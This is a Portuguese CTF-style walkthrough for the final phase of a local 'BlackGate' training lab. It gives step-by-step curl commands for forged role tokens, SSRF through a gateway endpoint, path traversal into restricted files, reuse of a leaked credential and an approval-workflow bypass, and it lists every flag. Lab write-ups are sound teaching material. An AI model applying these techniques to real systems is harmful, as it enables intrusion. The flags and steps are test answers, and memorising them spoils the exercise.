# Lab 05 - BlackGate - Walkthrough da Fase 9

Este walkthrough cobre a **Fase 9 - Final Admin Approval / Boss Flag** do Lab 05. A aplicacao mantem as fases anteriores e adiciona o fluxo final de aprovacao administrativa simulada em `legacy-panel.internal`.

Tudo continua seguro e local: nao ha request real para internet, banco externo, shell, upload, Redis, worker separado, filesystem real ou command injection real.

## Como subir

```bash
cd lab-05-blackgate
docker compose up --build
```

Acesse:

```text
http://localhost:8096
```

## Saude e versao

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/api/version
```

Resultado esperado:

```json
{
  "service": "blackgate",
  "status": "ok",
  "version": "1.8.0-phase9"
}
```

`/api/version` deve retornar build `bg-phase9-final-approval`.

## Login e contexto operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest&password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fases anteriores preservadas

Fase 3:

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Flag esperada:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

Fase 4:

```bash
CORE_META=$(node -e 'console.log(encodeURIComponent("http://api-core.internal/metadata"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CORE_META"
```

Flag esperada:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

Fase 5:

```bash
PHASE5_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PHASE5_FILE"
```

Flag esperada:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Obter legacy_session

Autentique no legacy realm com a credencial da Fase 6:

```bash
LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
```

Resultado esperado:

```text
bg6-legacy-session-migration
```

Acesse maintenance:

```bash
LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
```

Flag esperada da Fase 6:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

## Criar o job da Fase 7

```bash
CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
```

Flag esperada:

```text
FLAG{blackgate_report_workflow_abuse_phase7}
```

Job relevante:

```text
bg7-job-worker-diagnostics
```

## Processar o trace da Fase 8

```bash
WORKER_FLAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_FLAG"
```

Flag esperada:

```text
FLAG{blackgate_worker_processing_abuse_phase8}
```

Campos importantes para a Fase 9:

```text
review_id: BG-REV-9041
trace_marker: qtrace-9041
queue_ref: maintenance-worker:bg7-job-worker-diagnostics
```

## Ler arquivos restritos da Fase 9

Use o mesmo bypass controlado do Files Vault:

```bash
FINAL_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/final-review-notes.txt"))')
APPROVAL_RECON=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/approval-reconciliation.txt"))')
APPROVAL_POLICY=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/admin-approval-policy.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_NOTES"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_RECON"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_POLICY"
```

Pontos importantes:

- approval e reconciliado depois de queue traces;
- review IDs se ligam a trace markers;
- `queue_ref` usa formato `<queue>:<job_id>`;
- public admin role nao e suficiente;
- maintenance-originated reviews podem chegar na finalizacao quando os dados batem.

## Approval base e status

```bash
APPROVAL_HOME=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_HOME"
```

Sem review:

```bash
APPROVAL_STATUS_GENERIC=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_STATUS_GENERIC"
```

Com review correto:

```bash
APPROVAL_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_STATUS"
```

Resultado esperado:

```json
{
  "review_id": "BG-REV-9041",
  "state": "pending-admin",
  "queue_ref": "maintenance-worker:bg7-job-worker-diagnostics",
  "trace_marker_required": true,
  "finalizable": false
}
```

Audit limitado:

```bash
APPROVAL_AUDIT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/audit?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_AUDIT"
```

Sem flag.

## Decoys de reconciliation

Review errado:

```bash
RECON_BAD_REVIEW=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-0000&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_REVIEW"
```

Trace errado:

```bash
RECON_BAD_TRACE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-0000&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_TRACE"
```

Queue errada:

```bash
RECON_BAD_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=wrong"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_QUEUE"
```

Resultados esperados: `review_not_found`, `invalid_trace_marker` e `invalid_queue_ref`.

## Reconcile correto

```bash
RECONCILE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECONCILE"
```

Resultado esperado:

```json
{
  "service": "legacy-panel",
  "module": "approval",
  "review_id": "BG-REV-9041",
  "state": "reconciled",
  "reconciliation_token": "bg9-reconciled-BG-REV-9041",
  "note": "Reconciled maintenance reviews can be submitted to final approval."
}
```

## Decoys de finalizer

Finalizer admin:

```bash
FINAL_ADMIN=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=admin"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_ADMIN"
```

Resultado esperado: `public_admin_rejected`.

Finalizer operator:

```bash
FINAL_OPERATOR=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=operator"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_OPERATOR"
```

Resultado esperado: `operator_finalizer_rejected`.

Token errado:

```bash
FINAL_BAD_TOKEN=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bad&finalizer=maintenance"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_BAD_TOKEN"
```

Resultado esperado: `invalid_reconciliation_token`.

## Obter a flag final

```bash
FINAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=maintenance"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL"
```

Resposta esperada:

```json
{
  "service": "legacy-panel",
  "module": "approval",
  "review_id": "BG-REV-9041",
  "state": "finalized",
  "finalizer": "maintenance",
  "finding": "admin approval finalization trusted reconciled maintenance state",
  "flag": "FLAG{blackgate_final_admin_approval_boss_chain}",
  "complete": true
}
```

## Flags confirmadas do Lab 5

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
FLAG{blackgate_gateway_trust_ssrf_phase4}
FLAG{blackgate_files_vault_controlled_read_phase5}
FLAG{blackgate_legacy_credential_reuse_phase6}
FLAG{blackgate_report_workflow_abuse_phase7}
FLAG{blackgate_worker_processing_abuse_phase8}
FLAG{blackgate_final_admin_approval_boss_chain}
```

## Encerramento

A Fase 9 fecha o Lab 5 com uma cadeia completa de contexto fraco, gateway trust, file read controlado, credential reuse, workflow abuse, worker processing abuse e final approval bypass simulado.
